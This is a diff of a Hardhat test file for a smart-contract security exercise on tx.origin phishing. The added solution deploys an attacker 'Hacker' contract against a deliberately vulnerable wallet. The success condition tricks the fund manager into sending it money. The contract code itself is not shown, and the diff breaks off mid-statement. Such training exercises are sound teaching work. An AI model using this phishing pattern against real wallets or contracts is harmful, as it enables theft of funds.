@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { parseEther } = require("ethers/lib/utils");
 
 describe('TX Origin Phishing Exercise 1', function () {
 
@@ -11,8 +12,7 @@ describe('TX Origin Phishing Exercise 1', function () {
         /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
 
         [fundManager, attacker] = await ethers.getSigners();
-        
-        this.attackerContract = null;
+
 
         this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);
 
@@ -20,7 +20,7 @@ describe('TX Origin Phishing Exercise 1', function () {
             'contracts/tx-origin-phishing-1/SimpleSmartWallet.sol:SimpleSmartWallet',
             fundManager
         );
-        this.wallet = await simpleSmartWalletFactory.deploy({value: HEDGE_FUND_DEPOSIT});
+        this.wallet = await simpleSmartWalletFactory.deploy({ value: HEDGE_FUND_DEPOSIT });
 
         let smartWalletBalance = await ethers.provider.getBalance(this.wallet.address);
         expect(smartWalletBalance).to.equal(HEDGE_FUND_DEPOSIT);
@@ -28,12 +28,19 @@ describe('TX Origin Phishing Exercise 1', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR SOLUTION HERE */
-        
+        const hackerFactory = await ethers.getContractFactory(
+            'contracts/tx-origin-phishing-1/SimpleSmartWallet.sol:Hacker',
+            attacker
+        );
+        this.attackerContract = await hackerFactory.deploy(this.wallet.address);
+
+
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Fund manager is tricked to send a donation to the "charity" (attacker's contract)
         await fundManager.sendTransaction({
             to: this.attackerContract.address,
